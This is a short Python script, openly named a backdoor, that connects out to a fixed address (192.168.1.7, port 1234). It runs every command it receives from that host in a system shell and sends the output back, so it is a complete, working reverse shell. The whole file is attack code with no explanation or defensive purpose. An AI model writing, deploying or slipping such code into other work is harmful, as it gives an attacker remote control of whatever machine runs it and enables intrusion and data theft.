#!/usr/bin/python3
import socket
import subprocess

class Backdoor:
    def __init__(self,ip,port):
        self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connection.connect((ip,port))

    def execute_commands(self,command):
        return subprocess.check_output(command,shell=True)

    def Run(self):
        while(True):
            command = self.connection.recv(1024).decode('ascii')
            command_result = self.execute_commands(str(command))
            self.connection.send(command_result)
        self.connection.close()



my_backdoor = Backdoor("192.168.1.7",1234)
my_backdoor.Run()
